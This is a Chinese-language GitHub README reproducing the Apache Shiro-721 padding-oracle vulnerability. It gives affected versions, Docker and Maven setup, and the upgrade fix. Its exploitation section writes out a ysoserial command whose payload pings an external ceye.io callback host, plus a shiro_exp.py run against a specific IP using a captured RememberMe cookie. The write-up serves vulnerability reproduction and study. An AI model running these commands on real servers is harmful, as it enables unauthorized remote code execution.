# Shiro-721 RCE Via Padding Oracle Attack

![apache-shiro-logo.png](https://github.com/3ndz/Shiro-721/blob/master/image/apache-shiro-logo.png?raw=true)

##  

## 0x01 漏洞概述



Apache Shiro™（读作“sheeroh”，即日语“城”）是一个开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。

Shiro使用了AES-128-CBC模式对cookie进行加密，导致恶意用户可以通过Padding Oracle攻击方式构造序列化数据进行反序列化攻击,例如SHIRO-550。(Shiro-721)



![shiro.png](https://github.com/3ndz/Shiro-721/blob/master/image/shiro.png?raw=true)



## 0x02 影响版本



```
1.2.5,  
1.2.6,  
1.3.0,  
1.3.1,  
1.3.2,  
1.4.0-RC2,  
1.4.0,  
1.4.1
```

## 0x03 环境搭建



复现环境: Apache Shiro 1.4.1 + tomcat:8-jre8



1. **自行搭建：**



可从 Apache Shiro Gtihub 官方仓库自行下载漏洞影响版本(https://github.com/apache/shiro)，使用 Apache Maven(软件项目管理及自动构建工具) 编译构建生成 war Java 应用程序包。



```
git clone https://github.com/apache/shiro.git
cd shiro
git checkout shiro-root-1.4.1
mvn install
```

以下几项执行完成以后即可暂停，进而编译 `samples/web` 下的即可。

```
[INFO] Apache Shiro ....................................... SUCCESS [  1.630 s]
[INFO] Apache Shiro :: Core ............................... SUCCESS [ 46.175 s]
[INFO] Apache Shiro :: Web ................................ SUCCESS [  3.571 s]
```



```
cd samples/web
mvn install
```



将编译完成获取到的 **samples-web-1.4.1.war** 包( samples/target/中）拷贝到 Tomcat 的 webapps 目录下，启动tomcat即可。



1. **获取 Dockerfile ：**



```
git clone https://github.com/3ndz/Shiro-721.git
cd Shiro-721/Docker
docker build -t shiro-721 .
docker run -p 8080:8080 -d shiro-721
```



![docker.png](https://github.com/3ndz/Shiro-721/blob/master/image/index.png?raw=true)

## 0x04 漏洞利用



**攻击流程：**



1. 登录网站（勾选Remember），并从Cookie中获取合法的RememberMe。
2. 使用RememberMe cookie作为Padding Oracle Attack的前缀。
3. 加密 ysoserial 的序列化 payload，以通过Padding Oracle Attack制作恶意RememberMe。
4. 重放恶意RememberMe cookie，以执行反序列化攻击。



**1.**登录 Shiro 测试账户获取合法 Cookie（勾选Remember Me）：



![LOGIN.png](https://github.com/3ndz/Shiro-721/blob/master/image/login.png?raw=true)



(1) 认证失败时会设置deleteMe的cookie:

![false.png](https://github.com/3ndz/Shiro-721/blob/master/image/false.png?raw=true)

(2) 认证成功则不会设置deleteMe的cookie:

![true.png](https://github.com/3ndz/Shiro-721/blob/master/image/true.png?raw=true)

根据以上条件我们的思路是在正常序列化数据（需要一个已知的用户凭证获取正常序列化数据）后利用 Padding Oracle 构造我们自己的数据（**Java序列化数据后的脏数据不影响反序列化结果**），此时会有两中情况:



1. 构造的数据不能通过字符填充验证，返回deleteme;
2. 构造的数据可以成功解密通过字符填充验证，之后数据可以正常反序列化，不返回deleteme的cookie.



**2.**使用Java反序列化工具  ysoserial 生成 Payload:



```
java -jar ysoserial.jar CommonsBeanutils1 "ping 9rtmxe.ceye.io" > payload.class
```



**3.**通过 Padding Oracle Attack 生成 Evil Rememberme cookie:



```
python shiro_exp.py
Usage: shiro_exp.py <url> <somecookie value> <payload>
python shiro_exp.py http://47.98.224.70:8080/home.jsp xSEnrD1VPnQ49Tke8d9s7yXyBdKmcZTvF5KZ+8trI5/CQNSwsTJPlfBIEWj4ewouARb8LY4n1BQClrG6+Y5NsyyRhJwjbMKP9DenW7Dd78k9xeWfQZStuyyVsPG3Yq+fAgisJZ706Nzl0Sc2BsoA4COM2Frj5H4Tu3XQr3yer4lQawGdQPT8UCj4XqzuU9xgmmAWzlfEBe0f217/rhFF0dtLogcX7Jw1E0Q5xnoiiEf1Q76ynr/wKb74FqS0UfCHj67lE7yYYd1cjRw4IuM2c/JGppP5rMbuq7Nb5D/UrkMv/Cqv777YbQx90QjGw50v13NPjfoki6lgqwaI+woUh4thZQM6mHHTvE+A2S/a1sNJhYodne/9BQx5iONqjICnGRC5om9IG9XAm+lJ6ED6P1xxSqFNiXWh7JqCFk7YeEwpZoqLYR8EYq+uxqyOwsagOQSYnHVIzNkIcuNcvjBkDtRf37+T/0n0yz/8I3gYL+sV4eOh5ITXpKHTKdprKof4 payload.class
```



![image.png](https://github.com/3ndz/Shiro-721/blob/master/image/cookie.png?raw=true)

##  

**4.**使用Evil Rememberme cookie 认证进行反序列化攻击：



![attack.png](https://github.com/3ndz/Shiro-721/blob/master/image/attack.png?raw=true)



CEYE.io 接收到记录：



![Snipaste_2019-11-18_18-09-31.png](https://github.com/3ndz/Shiro-721/blob/master/image/ceye.png?raw=true)



## 0x06 修复方式



更新更新版本的 Apache Shior（1.4.2）即可。




**参考链接**:

1. [SHIRO-721 RememberMe Padding Oracle Vulnerability](https://issues.apache.org/jira/browse/SHIRO-721)
2. https://twitter.com/jas502n/status/1187664745437904897?lang=ca
3. https://www.anquanke.com/post/id/192819
4. https://github.com/wuppp/shiro_rce_exp
5. https://github.com/jas502n/SHIRO-721
